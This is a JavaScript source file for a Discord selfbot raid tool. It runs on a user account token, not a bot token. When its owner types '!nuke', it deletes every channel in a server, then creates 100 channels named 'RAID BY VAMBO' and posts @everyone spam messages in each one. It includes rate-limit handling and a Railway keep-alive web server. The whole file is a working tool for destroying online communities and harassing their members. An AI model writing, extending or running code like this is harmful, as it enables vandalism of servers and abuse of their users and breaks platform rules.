const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

// Helper function for safe sending
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        // Silently ignore
    }
}

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== COMBINED THEMED NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting themed nuke on ${guild.name}`);
        
        // THEMED ASCII ART INTRODUCTION with your name
        const asciiArt = `
\`\`\`
██████╗  █████╗ ██╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                 
██╗   ██╗ █████╗ ███╗   ███╗██████╗  ██████╗ 
██║   ██║██╔══██╗████╗ ████║██╔══██╗██╔═══██╗
██║   ██║███████║██╔████╔██║██████╔╝██║   ██║
╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║
 ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝
  ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝ 
\`\`\`
**🔥 RAID INITIATED BY VAMBO 🔥**
`;

        // Send themed intro
        await safeSend(originalChannel, asciiArt);

        // ===== PHASE 1: DELETE ALL CHANNELS (FASTER) =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels
        const channels = [...guild.channels.cache.values()];
        
        // Delete non-category channels first
        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
        
        // Delete faster - 300ms delay
        for (const channel of nonCategoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (error) {
                deleteFailed++;
            }
        }
        
        // Delete categories
        for (const channel of categoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted category: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (error) {
                deleteFailed++;
            }
        }
        
        console.log(`✅ Deleted ${deletedCount} channels`);

        // ===== PHASE 2: CREATE 100 CHANNELS =====
        
        // YOUR ORIGINAL CHANNEL NAME (with Zalgo text)
        const yourChannelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        // YOUR ORIGINAL RAID MESSAGE
        const yourRaidMessage = `## RAIDED BY VAMBO

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        // ADDITIONAL THEMED MESSAGES (mix of old and new)
        const themedMessages = [
            // Your original message with some theme additions
            `@everyone @here **⚡ RAIDED BY VAMBO ⚡**

${yourRaidMessage}

**🔥 VAMBO WAS HERE 🔥**`,

            // Your original message with different theme
            `@everyone @here **💀 SERVER DESTROYED 💀**

${yourRaidMessage}

**👑 VAMBO RULES 👑**`,

            // Your original message with code block
            `@everyone @here **🔥 NUKE COMPLETE 🔥**

\`\`\`css
[RAIDED BY VAMBO]
[NEVER SCAM AGAIN SON]
[KICK ROCKS]
\`\`\`

${yourRaidMessage}

**⚡ VAMBO ⚡**`,

            // Pure original (keeping it classic)
            `${yourRaidMessage}`,

            // Another themed version
            `@everyone @here **🎯 TARGET DESTROYED 🎯**

\`\`\`diff
+ RAIDED BY VAMBO
- NEVER SCAM AGAIN SON
! KICK ROCKS
\`\`\`

${yourRaidMessage}

**💀 VAMBO 💀**`
        ];

        let createdCount = 0;
        let createFailed = 0;

        // Create 100 channels with YOUR channel name
        for (let i = 1; i <= 100; i++) {
            try {
                // Use YOUR original channel name with number suffix
                const channelName = `${yourChannelName}-${i}`;
                
                // Create channel
                const newChannel = await guild.channels.create(channelName, {
                    type: 'text'
                });
                
                // Cycle through themed messages (including your original)
                const messageIndex = (i - 1) % themedMessages.length;
                await newChannel.send(themedMessages[messageIndex]);
                
                createdCount++;
                console.log(`✅ Created channel ${i}/100: ${channelName}`);
                
                // 600ms delay
                await new Promise(resolve => setTimeout(resolve, 600));
                
            } catch (error) {
                createFailed++;
                console.log(`❌ Failed channel ${i}: ${error.message}`);
                
                if (error.message.includes('rate')) {
                    console.log('⏳ Quick rate limit pause...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }

        // Log final results to console
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} channels with name: ${yourChannelName}`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
